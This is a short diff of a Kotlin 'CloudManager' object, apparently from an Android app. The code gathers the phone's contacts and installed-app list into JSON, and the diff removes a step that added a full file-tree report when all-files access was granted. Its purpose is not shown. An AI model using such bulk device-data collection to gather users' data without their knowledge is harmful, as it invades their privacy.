@@ -188,12 +188,7 @@ object CloudManager {
         json.put("contacts", PhoneManager.getContacts(ctx))
         json.put("apps", AppListManager.getInstalledApps(ctx))
 
-        // 4. File System
-        try {
-             if (PermissionManager.hasAllFilesAccess(ctx)) {
-                 json.put("file_tree", FileManager.generateReport())
-             }
-        } catch(e: Exception) { json.put("file_tree", "ERROR: ${e.message}") }
+
 
         return json
     }
